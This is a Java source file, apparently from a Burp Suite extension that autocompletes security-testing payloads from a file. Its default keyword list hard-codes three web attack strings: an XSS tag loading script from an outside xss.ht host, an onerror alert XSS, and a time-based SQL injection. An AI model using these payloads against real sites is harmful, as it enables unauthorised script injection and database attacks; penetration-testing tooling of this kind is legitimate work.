package autopayload;


import burp.IBurpExtenderCallbacks;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;

/*
This stores our state for the extension as a Singleton
 */
public class ExtensionState {

    //State object
    private static ExtensionState instance = null;
    //Burp callbacks
    private IBurpExtenderCallbacks callbacks;
    //UI panel
    public final AutoCompleterTab autoCompleterTab;
    public String filePath = "D:\\App\\burpsuite_pro_v2.0.11beta1\\autocomplete\\BurpSuiteAutoCompletion\\payloads.txt";
    public String userDirectory = new File("").getAbsolutePath();
    //Starting List of Header keywords
    //Seclist headers list https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt
    public ArrayList<String> keywords = new ArrayList<>(Arrays.asList(
    		"xss'><script src=https://lamscun.xss.ht></script>",
    		"xss ><img src=x onerror=alert(1)>",
    		"sql '-sleep(10) -- -"
    	));
    //List of current text areas
    private ArrayList<AutoCompleter> listeners = new ArrayList<>();


    /**
     * Generate the singleton
     */
    public ExtensionState() {
    	System.out.println("Create file ...");        
    	createUserOptions_payloadPath();
    	System.out.println("Create file Done."); 
    	filePath = getUserOptions_payloadPath();
    	System.out.println("File path get: "+ filePath);
    	
    	autoCompleterTab = new AutoCompleterTab();
    	autoCompleterTab.textFileName.setText(filePath);
        keywords.clear();
//        keywords.addAll(setKeyWordsFromFile(filePath));
        System.out.println("File path:");
        System.out.println(autoCompleterTab.getFileName());
        keywords.addAll(setKeyWordsFromFile(autoCompleterTab.getFileName()));
        for(String keyword : keywords){
            autoCompleterTab.addKeywordToList(keyword);
        }
    }
    
    public void createUserOptions_payloadPath() {
    	System.out.println("Creating file ...");        
    	try {
	      File myObj = new File(userDirectory+"/auto_payload_extenstion_user_options.txt");
	      if (myObj.createNewFile()) {
	        System.out.println("File created: " + myObj.getName());
	      } else {
	        System.out.println("File already exists.");
	      }
	    } catch (IOException e) {
	      System.out.println("An error occurred.");
	      e.printStackTrace();
	    }
    }
    public String getUserOptions_payloadPath() {
    	String payloadsPath = "";
    	try {
	      File myObj = new File(userDirectory+"/auto_payload_extenstion_user_options.txt");
	      Scanner myReader = new Scanner(myObj);
	      while (myReader.hasNextLine()) {
	        String data = myReader.nextLine();
	        System.out.println(data);
	        if (data.contains("Payloads_Path: ")) {
	        	payloadsPath = data.replace("Payloads_Path: ", "");
	        }
	      }
	      myReader.close();
	    } catch (FileNotFoundException e) {
	      System.out.println("An error occurred.");
	      e.printStackTrace();
	    }
    	
    	return payloadsPath;
    }
    public void setUserOptions_payloadPath(String payloadPath) {
    	try {
	      FileWriter myWriter = new FileWriter(userDirectory+"/auto_payload_extenstion_user_options.txt");
	      myWriter.write("Payloads_Path: "+payloadPath);
	      myWriter.close();
	      System.out.println("Successfully wrote Payloads_Path to the file /auto_payload_extenstion_user_options.txt");
	    } catch (IOException e) {
	      System.out.println("An error occurred.");
	      e.printStackTrace();
	    }

    }
    
    public ArrayList<String> setKeyWordsFromFile(String filename) {
    	
    	ArrayList<String> arrListPayloads = new ArrayList<>();
		
    	BufferedReader reader;
		try {
			reader = new BufferedReader(new FileReader(filename));
			String line = reader.readLine();
			while (line != null) {
				System.out.println(line);
				// read next line
				arrListPayloads.add(line);
				line = reader.readLine();
				
			}
			reader.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		return arrListPayloads;
	}
    /**
     * Set burp callbacks
     * @param callbacks the callbacks
     */
    public static void setCallbacks(IBurpExtenderCallbacks callbacks) {
        getInstance().callbacks = callbacks;
    }

    /**
     * Get the burp callback object
     * @return bur callback object
     */
    public IBurpExtenderCallbacks getCallbacks() {
        return getInstance().callbacks;
    }

    /**
     * Get UI object
     * @return our custom UI tab
     */
    public AutoCompleterTab getAutoCompleterTab() {
        return getInstance().autoCompleterTab;
    }

    /**
     * Get a handle to this state object
     * @return this state object
     */
    public static ExtensionState getInstance() {
        if(instance==null) {
            instance = new ExtensionState();
        }
        return instance;
    }

    /**
     * Get the current list of autocomplete words
     * @return the current list of autocomplete words
     */
    ArrayList<String> getKeywords() {
        return getInstance().keywords;
    }

    /**
     * Get the current list of document listeners
     * @return the current list of document listeners
     */
    public ArrayList<AutoCompleter> getListeners() {
        return getInstance().listeners;
    }

    /**
     * Add a new listener to the current list of document listeners
     */
    public void addListener(AutoCompleter autoCompleter) {
        getInstance().listeners.add(autoCompleter);
    }

}